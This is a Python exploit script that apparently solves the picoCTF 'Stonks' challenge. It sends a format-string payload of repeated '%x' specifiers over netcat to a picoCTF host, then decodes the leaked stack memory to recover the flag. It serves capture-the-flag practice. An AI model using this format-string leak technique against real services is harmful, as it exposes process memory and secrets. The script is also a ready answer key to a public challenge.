#!/usr/bin/env python

import os
import re
import sys
import subprocess

from termcolor import colored


def main():
    Stonks('mercury.picoctf.net',  27912).flag()


class Stonks:
    STACK_LEAK_SIZE = 128

    def __init__(self, host: str, port: int) -> None:
        """Initialize."""
        self.host = host
        self.port = port

    def flag(self) -> None:
        """Get the flag."""

        data: bytes = self.nc()

        memory: bytes = self.exctract(data, b"((?<=\n)([0-9a-fA-Z]\|?)+(?=\n))", "stack memory")

        decoded: bytes = self.parse(memory)

        flag: bytes = self.exctract(decoded, b"(picoCTF{\w*})", "flag")

        flag: str = self.decode(flag)

        print(os.environ.get('FLAG_STYLE')
              .replace('\\n', '\n')
              .replace('\\e', '\033')
              .replace('%s', flag))

    def nc(self) -> bytes:
        """Use netcat to connect to the server, and send the exploit."""

        inp = "{}\n{}\n".format(1, ("%x|" * self.STACK_LEAK_SIZE)[:-1])

        print("\n{} {}...\n{}".format(
            colored(f'nc', 'blue', attrs=['bold']),
            colored(f'{self.host} {self.port}', 'yellow', attrs=['bold']),
            colored(inp, 'green'),
        ))

        data = subprocess.run(
            ["nc", str(self.host), str(self.port)],
            input=inp.encode(),
            capture_output=True
        ).stdout

        print(data.decode())

        return data

    def exctract(self, context: bytes, pattern: bytes, name: str) -> str:
        """Extract pattern from context."""

        print("\n{}...".format(
            colored(f"Extracting {name}", 'blue', attrs=['bold']),
        ))

        extracted = re.search(pattern, context).group(1)

        print(extracted)

        return extracted

    def parse(self, memory) -> bytes:
        """Parse the bytes."""

        print("\n{}...".format(
            colored("Parsing memory bytes", 'blue', attrs=['bold']),
        ))

        def decode(hex: bytes) -> bytes:
            """Decode hex bytes."""
            try:
                return bytes.fromhex(hex.decode())[::-1]
            except ValueError:
                return hex

        decoded = b''.join(map(decode, (b for b in memory.split(b'|'))))

        print(decoded)

        return decoded

    def decode(self, flag: bytes) -> str:
        """Decode the flag."""

        print("\n{}...".format(
            colored("Decoding", 'blue', attrs=['bold']),
        ))

        return flag.decode()


if __name__ == '__main__':
    main()
